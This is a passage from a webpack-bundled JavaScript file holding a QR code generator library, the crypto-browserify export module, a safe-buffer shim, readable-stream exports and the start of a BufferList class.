            BitBuffer = __webpack_require__(187),
            util = __webpack_require__(188),
            Polynomial = __webpack_require__(79);
        function QRCode(typeNumber, errorCorrectLevel) {
            (this.typeNumber = typeNumber), (this.errorCorrectLevel = errorCorrectLevel), (this.modules = null), (this.moduleCount = 0), (this.dataCache = null), (this.dataList = []);
        }
        var proto = QRCode.prototype;
        (proto.addData = function (data) {
            var newData = new BitByte(data);
            this.dataList.push(newData), (this.dataCache = null);
        }),
            (proto.isDark = function (row, col) {
                if (row < 0 || this.moduleCount <= row || col < 0 || this.moduleCount <= col) throw new Error(row + "," + col);
                return this.modules[row][col];
            }),
            (proto.getModuleCount = function () {
                return this.moduleCount;
            }),
            (proto.make = function () {
                if (this.typeNumber < 1) {
                    var typeNumber = 1;
                    for (typeNumber = 1; typeNumber < 40; typeNumber++) {
                        for (var rsBlocks = RSBlock.getRSBlocks(typeNumber, this.errorCorrectLevel), buffer = new BitBuffer(), totalDataCount = 0, i = 0; i < rsBlocks.length; i++) totalDataCount += rsBlocks[i].dataCount;
                        for (i = 0; i < this.dataList.length; i++) {
                            var data = this.dataList[i];
                            buffer.put(data.mode, 4), buffer.put(data.getLength(), util.getLengthInBits(data.mode, typeNumber)), data.write(buffer);
                        }
                        if (buffer.getLengthInBits() <= 8 * totalDataCount) break;
                    }
                    this.typeNumber = typeNumber;
                }
                this.makeImpl(!1, this.getBestMaskPattern());
            }),
            (proto.makeImpl = function (test, maskPattern) {
                (this.moduleCount = 4 * this.typeNumber + 17), (this.modules = new Array(this.moduleCount));
                for (var row = 0; row < this.moduleCount; row++) {
                    this.modules[row] = new Array(this.moduleCount);
                    for (var col = 0; col < this.moduleCount; col++) this.modules[row][col] = null;
                }
                this.setupPositionProbePattern(0, 0),
                    this.setupPositionProbePattern(this.moduleCount - 7, 0),
                    this.setupPositionProbePattern(0, this.moduleCount - 7),
                    this.setupPositionAdjustPattern(),
                    this.setupTimingPattern(),
                    this.setupTypeInfo(test, maskPattern),
                    this.typeNumber >= 7 && this.setupTypeNumber(test),
                    null == this.dataCache && (this.dataCache = QRCode.createData(this.typeNumber, this.errorCorrectLevel, this.dataList)),
                    this.mapData(this.dataCache, maskPattern);
            }),
            (proto.setupPositionProbePattern = function (row, col) {
                for (var r = -1; r <= 7; r++)
                    if (!(row + r <= -1 || this.moduleCount <= row + r))
                        for (var c = -1; c <= 7; c++)
                            col + c <= -1 || this.moduleCount <= col + c || (this.modules[row + r][col + c] = (0 <= r && r <= 6 && (0 == c || 6 == c)) || (0 <= c && c <= 6 && (0 == r || 6 == r)) || (2 <= r && r <= 4 && 2 <= c && c <= 4));
            }),
            (proto.getBestMaskPattern = function () {
                for (var minLostPoint = 0, pattern = 0, i = 0; i < 8; i++) {
                    this.makeImpl(!0, i);
                    var lostPoint = util.getLostPoint(this);
                    (0 == i || minLostPoint > lostPoint) && ((minLostPoint = lostPoint), (pattern = i));
                }
                return pattern;
            }),
            (proto.createMovieClip = function (target_mc, instance_name, depth) {
                var qr_mc = target_mc.createEmptyMovieClip(instance_name, depth);
                this.make();
                for (var row = 0; row < this.modules.length; row++)
                    for (var y = 1 * row, col = 0; col < this.modules[row].length; col++) {
                        var x = 1 * col;
                        this.modules[row][col] && (qr_mc.beginFill(0, 100), qr_mc.moveTo(x, y), qr_mc.lineTo(x + 1, y), qr_mc.lineTo(x + 1, y + 1), qr_mc.lineTo(x, y + 1), qr_mc.endFill());
                    }
                return qr_mc;
            }),
            (proto.setupTimingPattern = function () {
                for (var r = 8; r < this.moduleCount - 8; r++) null == this.modules[r][6] && (this.modules[r][6] = r % 2 == 0);
                for (var c = 8; c < this.moduleCount - 8; c++) null == this.modules[6][c] && (this.modules[6][c] = c % 2 == 0);
            }),
            (proto.setupPositionAdjustPattern = function () {
                for (var pos = util.getPatternPosition(this.typeNumber), i = 0; i < pos.length; i++)
                    for (var j = 0; j < pos.length; j++) {
                        var row = pos[i],
                            col = pos[j];
                        if (null == this.modules[row][col]) for (var r = -2; r <= 2; r++) for (var c = -2; c <= 2; c++) this.modules[row + r][col + c] = -2 == r || 2 == r || -2 == c || 2 == c || (0 == r && 0 == c);
                    }
            }),
            (proto.setupTypeNumber = function (test) {
                for (var bits = util.getBCHTypeNumber(this.typeNumber), i = 0; i < 18; i++) {
                    var mod = !test && 1 == ((bits >> i) & 1);
                    this.modules[Math.floor(i / 3)][(i % 3) + this.moduleCount - 8 - 3] = mod;
                }
                for (i = 0; i < 18; i++) {
                    mod = !test && 1 == ((bits >> i) & 1);
                    this.modules[(i % 3) + this.moduleCount - 8 - 3][Math.floor(i / 3)] = mod;
                }
            }),
            (proto.setupTypeInfo = function (test, maskPattern) {
                for (var data = (this.errorCorrectLevel << 3) | maskPattern, bits = util.getBCHTypeInfo(data), i = 0; i < 15; i++) {
                    var mod = !test && 1 == ((bits >> i) & 1);
                    i < 6 ? (this.modules[i][8] = mod) : i < 8 ? (this.modules[i + 1][8] = mod) : (this.modules[this.moduleCount - 15 + i][8] = mod);
                }
                for (i = 0; i < 15; i++) {
                    mod = !test && 1 == ((bits >> i) & 1);
                    i < 8 ? (this.modules[8][this.moduleCount - i - 1] = mod) : i < 9 ? (this.modules[8][15 - i - 1 + 1] = mod) : (this.modules[8][15 - i - 1] = mod);
                }
                this.modules[this.moduleCount - 8][8] = !test;
            }),
            (proto.mapData = function (data, maskPattern) {
                for (var inc = -1, row = this.moduleCount - 1, bitIndex = 7, byteIndex = 0, col = this.moduleCount - 1; col > 0; col -= 2)
                    for (6 == col && col--; ; ) {
                        for (var c = 0; c < 2; c++)
                            if (null == this.modules[row][col - c]) {
                                var dark = !1;
                                byteIndex < data.length && (dark = 1 == ((data[byteIndex] >>> bitIndex) & 1)),
                                    util.getMask(maskPattern, row, col - c) && (dark = !dark),
                                    (this.modules[row][col - c] = dark),
                                    -1 == --bitIndex && (byteIndex++, (bitIndex = 7));
                            }
                        if ((row += inc) < 0 || this.moduleCount <= row) {
                            (row -= inc), (inc = -inc);
                            break;
                        }
                    }
            }),
            (QRCode.PAD0 = 236),
            (QRCode.PAD1 = 17),
            (QRCode.createData = function (typeNumber, errorCorrectLevel, dataList) {
                for (var rsBlocks = RSBlock.getRSBlocks(typeNumber, errorCorrectLevel), buffer = new BitBuffer(), i = 0; i < dataList.length; i++) {
                    var data = dataList[i];
                    buffer.put(data.mode, 4), buffer.put(data.getLength(), util.getLengthInBits(data.mode, typeNumber)), data.write(buffer);
                }
                var totalDataCount = 0;
                for (i = 0; i < rsBlocks.length; i++) totalDataCount += rsBlocks[i].dataCount;
                if (buffer.getLengthInBits() > 8 * totalDataCount) throw new Error("code length overflow. (" + buffer.getLengthInBits() + ">" + 8 * totalDataCount + ")");
                for (buffer.getLengthInBits() + 4 <= 8 * totalDataCount && buffer.put(0, 4); buffer.getLengthInBits() % 8 != 0; ) buffer.putBit(!1);
                for (; !(buffer.getLengthInBits() >= 8 * totalDataCount || (buffer.put(QRCode.PAD0, 8), buffer.getLengthInBits() >= 8 * totalDataCount)); ) buffer.put(QRCode.PAD1, 8);
                return QRCode.createBytes(buffer, rsBlocks);
            }),
            (QRCode.createBytes = function (buffer, rsBlocks) {
                for (var offset = 0, maxDcCount = 0, maxEcCount = 0, dcdata = new Array(rsBlocks.length), ecdata = new Array(rsBlocks.length), r = 0; r < rsBlocks.length; r++) {
                    var dcCount = rsBlocks[r].dataCount,
                        ecCount = rsBlocks[r].totalCount - dcCount;
                    (maxDcCount = Math.max(maxDcCount, dcCount)), (maxEcCount = Math.max(maxEcCount, ecCount)), (dcdata[r] = new Array(dcCount));
                    for (var i = 0; i < dcdata[r].length; i++) dcdata[r][i] = 255 & buffer.buffer[i + offset];
                    offset += dcCount;
                    var rsPoly = util.getErrorCorrectPolynomial(ecCount),
                        modPoly = new Polynomial(dcdata[r], rsPoly.getLength() - 1).mod(rsPoly);
                    ecdata[r] = new Array(rsPoly.getLength() - 1);
                    for (i = 0; i < ecdata[r].length; i++) {
                        var modIndex = i + modPoly.getLength() - ecdata[r].length;
                        ecdata[r][i] = modIndex >= 0 ? modPoly.get(modIndex) : 0;
                    }
                }
                var totalCodeCount = 0;
                for (i = 0; i < rsBlocks.length; i++) totalCodeCount += rsBlocks[i].totalCount;
                var data = new Array(totalCodeCount),
                    index = 0;
                for (i = 0; i < maxDcCount; i++) for (r = 0; r < rsBlocks.length; r++) i < dcdata[r].length && (data[index++] = dcdata[r][i]);
                for (i = 0; i < maxEcCount; i++) for (r = 0; r < rsBlocks.length; r++) i < ecdata[r].length && (data[index++] = ecdata[r][i]);
                return data;
            }),
            (module.exports = QRCode);
    },
    function (module, exports, __webpack_require__) {
        var mode = __webpack_require__(77);
        function QR8bitByte(data) {
            (this.mode = mode.MODE_8BIT_BYTE), (this.data = data);
        }
        (QR8bitByte.prototype = {
            getLength: function (buffer) {
                return this.data.length;
            },
            write: function (buffer) {
                for (var i = 0; i < this.data.length; i++) buffer.put(this.data.charCodeAt(i), 8);
            },
        }),
            (module.exports = QR8bitByte);
    },
    function (module, exports, __webpack_require__) {
        var ECL = __webpack_require__(78);
        function QRRSBlock(totalCount, dataCount) {
            (this.totalCount = totalCount), (this.dataCount = dataCount);
        }
        (QRRSBlock.RS_BLOCK_TABLE = [
            [1, 26, 19],
            [1, 26, 16],
            [1, 26, 13],
            [1, 26, 9],
            [1, 44, 34],
            [1, 44, 28],
            [1, 44, 22],
            [1, 44, 16],
            [1, 70, 55],
            [1, 70, 44],
            [2, 35, 17],
            [2, 35, 13],
            [1, 100, 80],
            [2, 50, 32],
            [2, 50, 24],
            [4, 25, 9],
            [1, 134, 108],
            [2, 67, 43],
            [2, 33, 15, 2, 34, 16],
            [2, 33, 11, 2, 34, 12],
            [2, 86, 68],
            [4, 43, 27],
            [4, 43, 19],
            [4, 43, 15],
            [2, 98, 78],
            [4, 49, 31],
            [2, 32, 14, 4, 33, 15],
            [4, 39, 13, 1, 40, 14],
            [2, 121, 97],
            [2, 60, 38, 2, 61, 39],
            [4, 40, 18, 2, 41, 19],
            [4, 40, 14, 2, 41, 15],
            [2, 146, 116],
            [3, 58, 36, 2, 59, 37],
            [4, 36, 16, 4, 37, 17],
            [4, 36, 12, 4, 37, 13],
            [2, 86, 68, 2, 87, 69],
            [4, 69, 43, 1, 70, 44],
            [6, 43, 19, 2, 44, 20],
            [6, 43, 15, 2, 44, 16],
            [4, 101, 81],
            [1, 80, 50, 4, 81, 51],
            [4, 50, 22, 4, 51, 23],
            [3, 36, 12, 8, 37, 13],
            [2, 116, 92, 2, 117, 93],
            [6, 58, 36, 2, 59, 37],
            [4, 46, 20, 6, 47, 21],
            [7, 42, 14, 4, 43, 15],
            [4, 133, 107],
            [8, 59, 37, 1, 60, 38],
            [8, 44, 20, 4, 45, 21],
            [12, 33, 11, 4, 34, 12],
            [3, 145, 115, 1, 146, 116],
            [4, 64, 40, 5, 65, 41],
            [11, 36, 16, 5, 37, 17],
            [11, 36, 12, 5, 37, 13],
            [5, 109, 87, 1, 110, 88],
            [5, 65, 41, 5, 66, 42],
            [5, 54, 24, 7, 55, 25],
            [11, 36, 12],
            [5, 122, 98, 1, 123, 99],
            [7, 73, 45, 3, 74, 46],
            [15, 43, 19, 2, 44, 20],
            [3, 45, 15, 13, 46, 16],
            [1, 135, 107, 5, 136, 108],
            [10, 74, 46, 1, 75, 47],
            [1, 50, 22, 15, 51, 23],
            [2, 42, 14, 17, 43, 15],
            [5, 150, 120, 1, 151, 121],
            [9, 69, 43, 4, 70, 44],
            [17, 50, 22, 1, 51, 23],
            [2, 42, 14, 19, 43, 15],
            [3, 141, 113, 4, 142, 114],
            [3, 70, 44, 11, 71, 45],
            [17, 47, 21, 4, 48, 22],
            [9, 39, 13, 16, 40, 14],
            [3, 135, 107, 5, 136, 108],
            [3, 67, 41, 13, 68, 42],
            [15, 54, 24, 5, 55, 25],
            [15, 43, 15, 10, 44, 16],
            [4, 144, 116, 4, 145, 117],
            [17, 68, 42],
            [17, 50, 22, 6, 51, 23],
            [19, 46, 16, 6, 47, 17],
            [2, 139, 111, 7, 140, 112],
            [17, 74, 46],
            [7, 54, 24, 16, 55, 25],
            [34, 37, 13],
            [4, 151, 121, 5, 152, 122],
            [4, 75, 47, 14, 76, 48],
            [11, 54, 24, 14, 55, 25],
            [16, 45, 15, 14, 46, 16],
            [6, 147, 117, 4, 148, 118],
            [6, 73, 45, 14, 74, 46],
            [11, 54, 24, 16, 55, 25],
            [30, 46, 16, 2, 47, 17],
            [8, 132, 106, 4, 133, 107],
            [8, 75, 47, 13, 76, 48],
            [7, 54, 24, 22, 55, 25],
            [22, 45, 15, 13, 46, 16],
            [10, 142, 114, 2, 143, 115],
            [19, 74, 46, 4, 75, 47],
            [28, 50, 22, 6, 51, 23],
            [33, 46, 16, 4, 47, 17],
            [8, 152, 122, 4, 153, 123],
            [22, 73, 45, 3, 74, 46],
            [8, 53, 23, 26, 54, 24],
            [12, 45, 15, 28, 46, 16],
            [3, 147, 117, 10, 148, 118],
            [3, 73, 45, 23, 74, 46],
            [4, 54, 24, 31, 55, 25],
            [11, 45, 15, 31, 46, 16],
            [7, 146, 116, 7, 147, 117],
            [21, 73, 45, 7, 74, 46],
            [1, 53, 23, 37, 54, 24],
            [19, 45, 15, 26, 46, 16],
            [5, 145, 115, 10, 146, 116],
            [19, 75, 47, 10, 76, 48],
            [15, 54, 24, 25, 55, 25],
            [23, 45, 15, 25, 46, 16],
            [13, 145, 115, 3, 146, 116],
            [2, 74, 46, 29, 75, 47],
            [42, 54, 24, 1, 55, 25],
            [23, 45, 15, 28, 46, 16],
            [17, 145, 115],
            [10, 74, 46, 23, 75, 47],
            [10, 54, 24, 35, 55, 25],
            [19, 45, 15, 35, 46, 16],
            [17, 145, 115, 1, 146, 116],
            [14, 74, 46, 21, 75, 47],
            [29, 54, 24, 19, 55, 25],
            [11, 45, 15, 46, 46, 16],
            [13, 145, 115, 6, 146, 116],
            [14, 74, 46, 23, 75, 47],
            [44, 54, 24, 7, 55, 25],
            [59, 46, 16, 1, 47, 17],
            [12, 151, 121, 7, 152, 122],
            [12, 75, 47, 26, 76, 48],
            [39, 54, 24, 14, 55, 25],
            [22, 45, 15, 41, 46, 16],
            [6, 151, 121, 14, 152, 122],
            [6, 75, 47, 34, 76, 48],
            [46, 54, 24, 10, 55, 25],
            [2, 45, 15, 64, 46, 16],
            [17, 152, 122, 4, 153, 123],
            [29, 74, 46, 14, 75, 47],
            [49, 54, 24, 10, 55, 25],
            [24, 45, 15, 46, 46, 16],
            [4, 152, 122, 18, 153, 123],
            [13, 74, 46, 32, 75, 47],
            [48, 54, 24, 14, 55, 25],
            [42, 45, 15, 32, 46, 16],
            [20, 147, 117, 4, 148, 118],
            [40, 75, 47, 7, 76, 48],
            [43, 54, 24, 22, 55, 25],
            [10, 45, 15, 67, 46, 16],
            [19, 148, 118, 6, 149, 119],
            [18, 75, 47, 31, 76, 48],
            [34, 54, 24, 34, 55, 25],
            [20, 45, 15, 61, 46, 16],
        ]),
            (QRRSBlock.getRSBlocks = function (typeNumber, errorCorrectLevel) {
                var rsBlock = QRRSBlock.getRsBlockTable(typeNumber, errorCorrectLevel);
                if (null == rsBlock) throw new Error("bad rs block @ typeNumber:" + typeNumber + "/errorCorrectLevel:" + errorCorrectLevel);
                for (var length = rsBlock.length / 3, list = new Array(), i = 0; i < length; i++)
                    for (var count = rsBlock[3 * i + 0], totalCount = rsBlock[3 * i + 1], dataCount = rsBlock[3 * i + 2], j = 0; j < count; j++) list.push(new QRRSBlock(totalCount, dataCount));
                return list;
            }),
            (QRRSBlock.getRsBlockTable = function (typeNumber, errorCorrectLevel) {
                switch (errorCorrectLevel) {
                    case ECL.L:
                        return QRRSBlock.RS_BLOCK_TABLE[4 * (typeNumber - 1) + 0];
                    case ECL.M:
                        return QRRSBlock.RS_BLOCK_TABLE[4 * (typeNumber - 1) + 1];
                    case ECL.Q:
                        return QRRSBlock.RS_BLOCK_TABLE[4 * (typeNumber - 1) + 2];
                    case ECL.H:
                        return QRRSBlock.RS_BLOCK_TABLE[4 * (typeNumber - 1) + 3];
                    default:
                        return;
                }
            }),
            (module.exports = QRRSBlock);
    },
    function (module, exports) {
        function QRBitBuffer() {
            (this.buffer = new Array()), (this.length = 0);
        }
        (QRBitBuffer.prototype = {
            get: function (index) {
                var bufIndex = Math.floor(index / 8);
                return 1 == ((this.buffer[bufIndex] >>> (7 - (index % 8))) & 1);
            },
            put: function (num, length) {
                for (var i = 0; i < length; i++) this.putBit(1 == ((num >>> (length - i - 1)) & 1));
            },
            getLengthInBits: function () {
                return this.length;
            },
            putBit: function (bit) {
                var bufIndex = Math.floor(this.length / 8);
                this.buffer.length <= bufIndex && this.buffer.push(0), bit && (this.buffer[bufIndex] |= 128 >>> this.length % 8), this.length++;
            },
        }),
            (module.exports = QRBitBuffer);
    },
    function (module, exports, __webpack_require__) {
        var Mode = __webpack_require__(77),
            Polynomial = __webpack_require__(79),
            math = __webpack_require__(80),
            QRMaskPattern_PATTERN000 = 0,
            QRMaskPattern_PATTERN001 = 1,
            QRMaskPattern_PATTERN010 = 2,
            QRMaskPattern_PATTERN011 = 3,
            QRMaskPattern_PATTERN100 = 4,
            QRMaskPattern_PATTERN101 = 5,
            QRMaskPattern_PATTERN110 = 6,
            QRMaskPattern_PATTERN111 = 7,
            QRUtil = {
                PATTERN_POSITION_TABLE: [
                    [],
                    [6, 18],
                    [6, 22],
                    [6, 26],
                    [6, 30],
                    [6, 34],
                    [6, 22, 38],
                    [6, 24, 42],
                    [6, 26, 46],
                    [6, 28, 50],
                    [6, 30, 54],
                    [6, 32, 58],
                    [6, 34, 62],
                    [6, 26, 46, 66],
                    [6, 26, 48, 70],
                    [6, 26, 50, 74],
                    [6, 30, 54, 78],
                    [6, 30, 56, 82],
                    [6, 30, 58, 86],
                    [6, 34, 62, 90],
                    [6, 28, 50, 72, 94],
                    [6, 26, 50, 74, 98],
                    [6, 30, 54, 78, 102],
                    [6, 28, 54, 80, 106],
                    [6, 32, 58, 84, 110],
                    [6, 30, 58, 86, 114],
                    [6, 34, 62, 90, 118],
                    [6, 26, 50, 74, 98, 122],
                    [6, 30, 54, 78, 102, 126],
                    [6, 26, 52, 78, 104, 130],
                    [6, 30, 56, 82, 108, 134],
                    [6, 34, 60, 86, 112, 138],
                    [6, 30, 58, 86, 114, 142],
                    [6, 34, 62, 90, 118, 146],
                    [6, 30, 54, 78, 102, 126, 150],
                    [6, 24, 50, 76, 102, 128, 154],
                    [6, 28, 54, 80, 106, 132, 158],
                    [6, 32, 58, 84, 110, 136, 162],
                    [6, 26, 54, 82, 110, 138, 166],
                    [6, 30, 58, 86, 114, 142, 170],
                ],
                G15: 1335,
                G18: 7973,
                G15_MASK: 21522,
                getBCHTypeInfo: function (data) {
                    for (var d = data << 10; QRUtil.getBCHDigit(d) - QRUtil.getBCHDigit(QRUtil.G15) >= 0; ) d ^= QRUtil.G15 << (QRUtil.getBCHDigit(d) - QRUtil.getBCHDigit(QRUtil.G15));
                    return ((data << 10) | d) ^ QRUtil.G15_MASK;
                },
                getBCHTypeNumber: function (data) {
                    for (var d = data << 12; QRUtil.getBCHDigit(d) - QRUtil.getBCHDigit(QRUtil.G18) >= 0; ) d ^= QRUtil.G18 << (QRUtil.getBCHDigit(d) - QRUtil.getBCHDigit(QRUtil.G18));
                    return (data << 12) | d;
                },
                getBCHDigit: function (data) {
                    for (var digit = 0; 0 != data; ) digit++, (data >>>= 1);
                    return digit;
                },
                getPatternPosition: function (typeNumber) {
                    return QRUtil.PATTERN_POSITION_TABLE[typeNumber - 1];
                },
                getMask: function (maskPattern, i, j) {
                    switch (maskPattern) {
                        case QRMaskPattern_PATTERN000:
                            return (i + j) % 2 == 0;
                        case QRMaskPattern_PATTERN001:
                            return i % 2 == 0;
                        case QRMaskPattern_PATTERN010:
                            return j % 3 == 0;
                        case QRMaskPattern_PATTERN011:
                            return (i + j) % 3 == 0;
                        case QRMaskPattern_PATTERN100:
                            return (Math.floor(i / 2) + Math.floor(j / 3)) % 2 == 0;
                        case QRMaskPattern_PATTERN101:
                            return ((i * j) % 2) + ((i * j) % 3) == 0;
                        case QRMaskPattern_PATTERN110:
                            return (((i * j) % 2) + ((i * j) % 3)) % 2 == 0;
                        case QRMaskPattern_PATTERN111:
                            return (((i * j) % 3) + ((i + j) % 2)) % 2 == 0;
                        default:
                            throw new Error("bad maskPattern:" + maskPattern);
                    }
                },
                getErrorCorrectPolynomial: function (errorCorrectLength) {
                    for (var a = new Polynomial([1], 0), i = 0; i < errorCorrectLength; i++) a = a.multiply(new Polynomial([1, math.gexp(i)], 0));
                    return a;
                },
                getLengthInBits: function (mode, type) {
                    if (1 <= type && type < 10)
                        switch (mode) {
                            case Mode.MODE_NUMBER:
                                return 10;
                            case Mode.MODE_ALPHA_NUM:
                                return 9;
                            case Mode.MODE_8BIT_BYTE:
                            case Mode.MODE_KANJI:
                                return 8;
                            default:
                                throw new Error("mode:" + mode);
                        }
                    else if (type < 27)
                        switch (mode) {
                            case Mode.MODE_NUMBER:
                                return 12;
                            case Mode.MODE_ALPHA_NUM:
                                return 11;
                            case Mode.MODE_8BIT_BYTE:
                                return 16;
                            case Mode.MODE_KANJI:
                                return 10;
                            default:
                                throw new Error("mode:" + mode);
                        }
                    else {
                        if (!(type < 41)) throw new Error("type:" + type);
                        switch (mode) {
                            case Mode.MODE_NUMBER:
                                return 14;
                            case Mode.MODE_ALPHA_NUM:
                                return 13;
                            case Mode.MODE_8BIT_BYTE:
                                return 16;
                            case Mode.MODE_KANJI:
                                return 12;
                            default:
                                throw new Error("mode:" + mode);
                        }
                    }
                },
                getLostPoint: function (qrCode) {
                    for (var moduleCount = qrCode.getModuleCount(), lostPoint = 0, row = 0; row < moduleCount; row++)
                        for (var col = 0; col < moduleCount; col++) {
                            for (var sameCount = 0, dark = qrCode.isDark(row, col), r = -1; r <= 1; r++)
                                if (!(row + r < 0 || moduleCount <= row + r)) for (var c = -1; c <= 1; c++) col + c < 0 || moduleCount <= col + c || (0 == r && 0 == c) || (dark == qrCode.isDark(row + r, col + c) && sameCount++);
                            sameCount > 5 && (lostPoint += 3 + sameCount - 5);
                        }
                    for (row = 0; row < moduleCount - 1; row++)
                        for (col = 0; col < moduleCount - 1; col++) {
                            var count = 0;
                            qrCode.isDark(row, col) && count++, qrCode.isDark(row + 1, col) && count++, qrCode.isDark(row, col + 1) && count++, qrCode.isDark(row + 1, col + 1) && count++, (0 != count && 4 != count) || (lostPoint += 3);
                        }
                    for (row = 0; row < moduleCount; row++)
                        for (col = 0; col < moduleCount - 6; col++)
                            qrCode.isDark(row, col) &&
                                !qrCode.isDark(row, col + 1) &&
                                qrCode.isDark(row, col + 2) &&
                                qrCode.isDark(row, col + 3) &&
                                qrCode.isDark(row, col + 4) &&
                                !qrCode.isDark(row, col + 5) &&
                                qrCode.isDark(row, col + 6) &&
                                (lostPoint += 40);
                    for (col = 0; col < moduleCount; col++)
                        for (row = 0; row < moduleCount - 6; row++)
                            qrCode.isDark(row, col) &&
                                !qrCode.isDark(row + 1, col) &&
                                qrCode.isDark(row + 2, col) &&
                                qrCode.isDark(row + 3, col) &&
                                qrCode.isDark(row + 4, col) &&
                                !qrCode.isDark(row + 5, col) &&
                                qrCode.isDark(row + 6, col) &&
                                (lostPoint += 40);
                    var darkCount = 0;
                    for (col = 0; col < moduleCount; col++) for (row = 0; row < moduleCount; row++) qrCode.isDark(row, col) && darkCount++;
                    return (lostPoint += 10 * (Math.abs((100 * darkCount) / moduleCount / moduleCount - 50) / 5));
                },
            };
        module.exports = QRUtil;
    },
    function (module, exports, __webpack_require__) {
        "use strict";
        (exports.randomBytes = exports.rng = exports.pseudoRandomBytes = exports.prng = __webpack_require__(24)), (exports.createHash = exports.Hash = __webpack_require__(33)), (exports.createHmac = exports.Hmac = __webpack_require__(95));
        var algos = __webpack_require__(216),
            algoKeys = Object.keys(algos),
            hashes = ["sha1", "sha224", "sha256", "sha384", "sha512", "md5", "rmd160"].concat(algoKeys);
        exports.getHashes = function () {
            return hashes;
        };
        var p = __webpack_require__(98);
        (exports.pbkdf2 = p.pbkdf2), (exports.pbkdf2Sync = p.pbkdf2Sync);
        var aes = __webpack_require__(218);
        (exports.Cipher = aes.Cipher),
            (exports.createCipher = aes.createCipher),
            (exports.Cipheriv = aes.Cipheriv),
            (exports.createCipheriv = aes.createCipheriv),
            (exports.Decipher = aes.Decipher),
            (exports.createDecipher = aes.createDecipher),
            (exports.Decipheriv = aes.Decipheriv),
            (exports.createDecipheriv = aes.createDecipheriv),
            (exports.getCiphers = aes.getCiphers),
            (exports.listCiphers = aes.listCiphers);
        var dh = __webpack_require__(233);
        (exports.DiffieHellmanGroup = dh.DiffieHellmanGroup),
            (exports.createDiffieHellmanGroup = dh.createDiffieHellmanGroup),
            (exports.getDiffieHellman = dh.getDiffieHellman),
            (exports.createDiffieHellman = dh.createDiffieHellman),
            (exports.DiffieHellman = dh.DiffieHellman);
        var sign = __webpack_require__(240);
        (exports.createSign = sign.createSign), (exports.Sign = sign.Sign), (exports.createVerify = sign.createVerify), (exports.Verify = sign.Verify), (exports.createECDH = __webpack_require__(281));
        var publicEncrypt = __webpack_require__(284);
        (exports.publicEncrypt = publicEncrypt.publicEncrypt), (exports.privateEncrypt = publicEncrypt.privateEncrypt), (exports.publicDecrypt = publicEncrypt.publicDecrypt), (exports.privateDecrypt = publicEncrypt.privateDecrypt);
        var rf = __webpack_require__(288);
        (exports.randomFill = rf.randomFill),
            (exports.randomFillSync = rf.randomFillSync),
            (exports.createCredentials = function () {
                throw new Error(["sorry, createCredentials is not implemented yet", "we accept pull requests", "https://github.com/crypto-browserify/crypto-browserify"].join("\n"));
            }),
            (exports.constants = {
                DH_CHECK_P_NOT_SAFE_PRIME: 2,
                DH_CHECK_P_NOT_PRIME: 1,
                DH_UNABLE_TO_CHECK_GENERATOR: 4,
                DH_NOT_SUITABLE_GENERATOR: 8,
                NPN_ENABLED: 1,
                ALPN_ENABLED: 1,
                RSA_PKCS1_PADDING: 1,
                RSA_SSLV23_PADDING: 2,
                RSA_NO_PADDING: 3,
                RSA_PKCS1_OAEP_PADDING: 4,
                RSA_X931_PADDING: 5,
                RSA_PKCS1_PSS_PADDING: 6,
                POINT_CONVERSION_COMPRESSED: 2,
                POINT_CONVERSION_UNCOMPRESSED: 4,
                POINT_CONVERSION_HYBRID: 6,
            });
    },
    function (module, exports, __webpack_require__) {
        var buffer = __webpack_require__(6),
            Buffer = buffer.Buffer;
        function copyProps(src, dst) {
            for (var key in src) dst[key] = src[key];
        }
        function SafeBuffer(arg, encodingOrOffset, length) {
            return Buffer(arg, encodingOrOffset, length);
        }
        Buffer.from && Buffer.alloc && Buffer.allocUnsafe && Buffer.allocUnsafeSlow ? (module.exports = buffer) : (copyProps(buffer, exports), (exports.Buffer = SafeBuffer)),
            (SafeBuffer.prototype = Object.create(Buffer.prototype)),
            copyProps(Buffer, SafeBuffer),
            (SafeBuffer.from = function (arg, encodingOrOffset, length) {
                if ("number" == typeof arg) throw new TypeError("Argument must not be a number");
                return Buffer(arg, encodingOrOffset, length);
            }),
            (SafeBuffer.alloc = function (size, fill, encoding) {
                if ("number" != typeof size) throw new TypeError("Argument must be a number");
                var buf = Buffer(size);
                return void 0 !== fill ? ("string" == typeof encoding ? buf.fill(fill, encoding) : buf.fill(fill)) : buf.fill(0), buf;
            }),
            (SafeBuffer.allocUnsafe = function (size) {
                if ("number" != typeof size) throw new TypeError("Argument must be a number");
                return Buffer(size);
            }),
            (SafeBuffer.allocUnsafeSlow = function (size) {
                if ("number" != typeof size) throw new TypeError("Argument must be a number");
                return buffer.SlowBuffer(size);
            });
    },
    function (module, exports, __webpack_require__) {
        ((exports = module.exports = __webpack_require__(83)).Stream = exports),
            (exports.Readable = exports),
            (exports.Writable = __webpack_require__(87)),
            (exports.Duplex = __webpack_require__(26)),
            (exports.Transform = __webpack_require__(88)),
            (exports.PassThrough = __webpack_require__(198)),
            (exports.finished = __webpack_require__(46)),
            (exports.pipeline = __webpack_require__(199));
    },
    function (module, exports) {},
    function (module, exports, __webpack_require__) {
        "use strict";
        function ownKeys(object, enumerableOnly) {
            var keys = Object.keys(object);
            if (Object.getOwnPropertySymbols) {
                var symbols = Object.getOwnPropertySymbols(object);
                enumerableOnly &&
                    (symbols = symbols.filter(function (sym) {
                        return Object.getOwnPropertyDescriptor(object, sym).enumerable;
                    })),
                    keys.push.apply(keys, symbols);
            }
            return keys;
        }
        function _defineProperty(obj, key, value) {
            return key in obj ? Object.defineProperty(obj, key, { value: value, enumerable: !0, configurable: !0, writable: !0 }) : (obj[key] = value), obj;
        }
        function _defineProperties(target, props) {
            for (var i = 0; i < props.length; i++) {
                var descriptor = props[i];
                (descriptor.enumerable = descriptor.enumerable || !1), (descriptor.configurable = !0), "value" in descriptor && (descriptor.writable = !0), Object.defineProperty(target, descriptor.key, descriptor);
            }
        }
        var Buffer = __webpack_require__(6).Buffer,
            inspect = __webpack_require__(194).inspect,
            custom = (inspect && inspect.custom) || "inspect";
        module.exports = (function () {
            function BufferList() {
                !(function (instance, Constructor) {
                    if (!(instance instanceof Constructor)) throw new TypeError("Cannot call a class as a function");
                })(this, BufferList),
                    (this.head = null),
                    (this.tail = null),
                    (this.length = 0);
            }
            var Constructor, protoProps, staticProps;
            return (
                (Constructor = BufferList),
                (protoProps = [
                    {
                        key: "push",
                        value: function (v) {
                            var entry = { data: v, next: null };
                            this.length > 0 ? (this.tail.next = entry) : (this.head = entry), (this.tail = entry), ++this.length;
                        },
                    },
                    {
                        key: "unshift",
                        value: function (v) {
                            var entry = { data: v, next: this.head };
                            0 === this.length && (this.tail = entry), (this.head = entry), ++this.length;
